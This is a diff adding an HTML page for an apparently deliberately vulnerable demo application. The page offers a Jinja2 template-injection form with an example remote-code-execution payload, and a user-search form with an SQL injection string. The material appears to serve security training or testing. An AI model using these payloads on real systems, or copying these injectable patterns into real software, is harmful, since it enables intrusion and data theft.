@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Project 1 Vulnerabilities</title>
+    <style>
+        body { font-family: sans-serif; max-width: 800px; margin: auto; padding: 20px; }
+        .vuln-section { border: 1px solid #ccc; padding: 15px; margin-bottom: 20px; border-radius: 5px; }
+        h2 { color: #d9534f; }
+        code { background-color: #f4f4f4; padding: 2px 6px; border-radius: 3px; }
+    </style>
+</head>
+<body>
+    <h1>Project 1: RCE & Container Escape</h1>
+    <p>This application contains multiple vulnerabilities for demonstration purposes.</p>
+
+    <div class="vuln-section">
+        <h2>Vulnerability 2: SSTI RCE (CVE-2024-28114 Style)</h2>
+        <p>This form submits a string to be rendered by the server's template engine (Jinja2). Enter a payload to test for SSTI.</p>
+        <form action="/render" method="post" target="_blank">
+            <textarea name="template" rows="4" cols="80">{{ 'Hello, ' ~ request.remote_addr }}</textarea><br><br>
+            <input type="submit" value="Render Template">
+        </form>
+        <p><b>Example Payload for RCE:</b> <code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}</code></p>
+    </div>
+
+    <div class="vuln-section">
+        <h2>Vulnerability 3: SQL Injection</h2>
+        <p>This form performs a user search. The backend query is improperly constructed.</p>
+        <form action="/search" method="get" target="_blank">
+            <input type="text" name="query" size="50" value="admin"><br><br>
+            <input type="submit" value="Search User">
+        </form>
+        <p><b>Example Payload for SQLi:</b> <code>' OR '1'='1</code></p>
+    </div>
+
+</body>
+</html>
